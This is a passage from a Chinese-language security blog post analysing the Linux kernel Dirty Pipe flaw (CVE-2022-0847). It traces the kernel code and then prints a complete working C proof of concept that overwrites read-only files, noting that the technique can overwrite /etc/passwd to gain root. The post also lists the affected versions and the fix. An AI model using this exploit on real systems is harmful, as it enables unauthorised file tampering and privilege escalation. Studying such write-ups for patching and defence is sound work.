bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	WARN_ON(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p> pagevec结构体</p>
<p>管理着一个page指针数组，PAGEVEC_SIZE大小为14</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pagevec</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> nr;</span><br><span class="line">	<span class="type">bool</span> percpu_pvec_drained;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">pages</span>[<span class="title">PAGEVEC_SIZE</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>最终到达copy_page_to_iter_pipe()函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line">	<span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">		bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sanity(i))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<span class="comment">//获取头缓冲区</span></span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line">			<span class="comment">/* merge with the last one */</span></span><br><span class="line">			buf-&gt;len += bytes;</span><br><span class="line">			i-&gt;iov_offset += bytes;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		i_head++;</span><br><span class="line">		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">	get_page(page);<span class="comment">//增加该page的ref_count</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这里最后是调用了</span></span><br><span class="line"><span class="comment">    static inline void page_ref_inc(struct page *page)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	atomic_inc(&amp;page-&gt;_refcount);</span></span><br><span class="line"><span class="comment">	if (page_ref_tracepoint_active(page_ref_mod))</span></span><br><span class="line"><span class="comment">		__page_ref_mod(page, 1);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	buf-&gt;page = page;</span><br><span class="line">	buf-&gt;offset = offset;</span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line">	<span class="comment">//这里是漏洞点 没有对buf-&gt;flag 初始化</span></span><br><span class="line">    </span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><ol>
<li>从文件到管道调用的splice()函数调用中，pipe buffer 关联page的时候没有对flag进行初始化</li>
<li>在调用pipe的write操作时，若我们没有设置O_DIRECT，则会设置PIPE_BUF_FLAG_CAN_MERGE</li>
<li>在调用pipe的write操作时，若page设置PIPE_BUF_FLAG_CAN_MERGE，且数据（不足一页大小的） 足以写入该页，则可以继续写入当前页（即上一个被写入数据的buffer），这就是所谓的MERGE操作。接下来开始对新的 buffer 进行数据写入，若没有<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位则分配新页面后写入</li>
</ol>
<p>​	我们可以先通过设置O_DIRECT，初始化管道，并对所有管道进行读写操作，这样子就让所有pipe_biffer的page都保留了PIPE_BUF_FLAG_CAN_MERGE 标志位。</p>
<p>紧接着我们使用splice函数，读取任意字节(小于一页但至少一字节)，使得管道pipe_buffer直接关联文件缓存页，但该函数又不对page的flag位进行任何操作。</p>
<p>此时我们在调用pipe的write操作，由于flag包含了PIPE_BUF_FLAG_CAN_MERGE标志，故write会对当前页，也就是splice read的文件缓存页，直接进行写入，这样我们就完成了越权写操作。</p>
<p>该漏洞的发现者自己公布了poc和exp，在这里放一下我复现的poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** envp)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage : %s FILEPATH EVILDATA OFFSET\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* filename = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span>* evildata = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">long</span> offset = strtoul(argv[<span class="number">3</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">long</span> data_size = <span class="built_in">strlen</span>(evildata);</span><br><span class="line">    <span class="type">long</span> end = offset + data_size;</span><br><span class="line">    <span class="type">unsigned</span> pipe_size;</span><br><span class="line">    <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt;= PAGE_SIZE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] offset error!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd = open(filename, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] stat failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Offset is not inside the file\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end &gt; st.st_size) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(p))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* initial page */</span></span><br><span class="line">    pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="comment">/* fill the pipe ,set all page get PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> current_size = pipe_size; current_size &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">        <span class="type">int</span> nbytes = current_size &gt; PAGE_SIZE ? PAGE_SIZE : current_size;</span><br><span class="line">        current_size -= write(p[<span class="number">1</span>], buf, nbytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free the pipe,but all page remain PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> current_size = pipe_size; current_size &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">        <span class="type">int</span> nbytes = current_size &gt; PAGE_SIZE ? PAGE_SIZE : current_size;</span><br><span class="line">        current_size -= read(p[<span class="number">0</span>], buf, nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Initial pipe done!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    offset -= <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> n = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] splice failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    n = write(p[<span class="number">1</span>], evildata, data_size);</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] write failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write done!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>验证：</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221111222643104.png" alt="image-20221111222643104"></p>
<p>可以看到 ，我们确实修改了一个仅有可读权限的文件，在实际运用中，可以利用此来进行覆写&#x2F;etc&#x2F;passwd 从而达到提权的目的。</p>
<p>调试的时候</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">size_t copy_page_from_iter(struct page *page, size_t offset, size_t bytes,</span><br><span class="line">			 struct iov_iter *i)</span><br><span class="line">&#123;</span><br><span class="line">	if (unlikely(!page_copy_sane(page, offset, bytes)))</span><br><span class="line">		return 0;</span><br><span class="line">	if (likely(iter_is_iovec(i)))</span><br><span class="line">		return copy_page_from_iter_iovec(page, offset, bytes, i);</span><br><span class="line">	if (iov_iter_is_bvec(i) || iov_iter_is_kvec(i) || iov_iter_is_xarray(i)) &#123;</span><br><span class="line">		void *kaddr = kmap_local_page(page); #虚拟地址</span><br><span class="line">		size_t wanted = _copy_from_iter(kaddr + offset, bytes, i);</span><br><span class="line">		kunmap_local(kaddr);</span><br><span class="line">		return wanted;</span><br><span class="line">	&#125;</span><br><span class="line">	WARN_ON(1);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/50d7be724a1d856240aade69e52311d.png" alt="50d7be724a1d856240aade69e52311d"></p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/e3f56d62659f747d222b77528e5614d.png" alt="e3f56d62659f747d222b77528e5614d"></p>
<h1 id="影响版本以及修复"><a href="#影响版本以及修复" class="headerlink" title="影响版本以及修复"></a>影响版本以及修复</h1><ul>
<li>8 &lt;&#x3D; Linux kernel &lt; 5.16.11</li>
<li>8 &lt;&#x3D; Linux kernel &lt; 5.15.25</li>
<li>8 &lt;&#x3D; Linux kernel &lt; 5.10.102</li>
</ul>
<p>修复:</p>
<p>在 <code>copy_page_to_iter_pipe </code>以及 <code>push_pipe</code> 添加 对 buf -&gt; flag &#x3D;0 的代码即可。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yangjiguang/p/6030423.html">https://www.cnblogs.com/yangjiguang/p/6030423.html</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/362499466">https://zhuanlan.zhihu.com/p/362499466</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1922497">https://cloud.tencent.com/developer/article/1922497</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/youzhangjing_/article/details/124967518">https://blog.csdn.net/youzhangjing_/article/details/124967518</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1848933">https://cloud.tencent.com/developer/article/1848933</a></p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/#pipe%EF%BC%9A%E7%AE%A1%E9%81%93">https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/#pipe%EF%BC%9A%E7%AE%A1%E9%81%93</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/83398714#:~:text=%E5%9F%BA%E4%BA%8E%20splice%20%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E9%9B%B6%E6%8B%B7%E8%B4%9D%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%95%B4%E4%B8%AA%E6%8B%B7%E8%B4%9D%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%8F%91%E7%94%9F%202%20%E6%AC%A1%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%EF%BC%8C0%20%E6%AC%A1%20CPU%20%E6%8B%B7%E8%B4%9D%E4%BB%A5%E5%8F%8A,DMA%20%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B0%86%E6%95%B0%E6%8D%AE%E4%BB%8E%E4%B8%BB%E5%AD%98%E6%88%96%E7%A1%AC%E7%9B%98%E6%8B%B7%E8%B4%9D%E5%88%B0%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%EF%BC%88kernel%20space%EF%BC%89%E7%9A%84%E8%AF%BB%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%88read%20buffer%EF%BC%89%E3%80%82.%20CPU%20%E5%9C%A8%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%E7%9A%84%E8%AF%BB%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%88read%20buffer%EF%BC%89%E5%92%8C%E7%BD%91%E7%BB%9C%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%88socket%20buffer%EF%BC%89%E4%B9%8B%E9%97%B4%E5%BB%BA%E7%AB%8B%E7%AE%A1%E9%81%93%EF%BC%88pipeline%EF%BC%89%E3%80%82">https://zhuanlan.zhihu.com/p/83398714#:~:text=%E5%9F%BA%E4%BA%8E%20splice%20%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E9%9B%B6%E6%8B%B7%E8%B4%9D%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%95%B4%E4%B8%AA%E6%8B%B7%E8%B4%9D%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%8F%91%E7%94%9F%202%20%E6%AC%A1%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%EF%BC%8C0%20%E6%AC%A1%20CPU%20%E6%8B%B7%E8%B4%9D%E4%BB%A5%E5%8F%8A,DMA%20%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B0%86%E6%95%B0%E6%8D%AE%E4%BB%8E%E4%B8%BB%E5%AD%98%E6%88%96%E7%A1%AC%E7%9B%98%E6%8B%B7%E8%B4%9D%E5%88%B0%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%EF%BC%88kernel%20space%EF%BC%89%E7%9A%84%E8%AF%BB%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%88read%20buffer%EF%BC%89%E3%80%82.%20CPU%20%E5%9C%A8%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%E7%9A%84%E8%AF%BB%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%88read%20buffer%EF%BC%89%E5%92%8C%E7%BD%91%E7%BB%9C%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%88socket%20buffer%EF%BC%89%E4%B9%8B%E9%97%B4%E5%BB%BA%E7%AB%8B%E7%AE%A1%E9%81%93%EF%BC%88pipeline%EF%BC%89%E3%80%82</a>.</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>7r1p13J</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/kernel/"># kernel</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/12/27/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/">系统编程实验</a>
            
            
            <a class="next" rel="next" href="/2022/12/15/NULLptr/">Nullptr</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>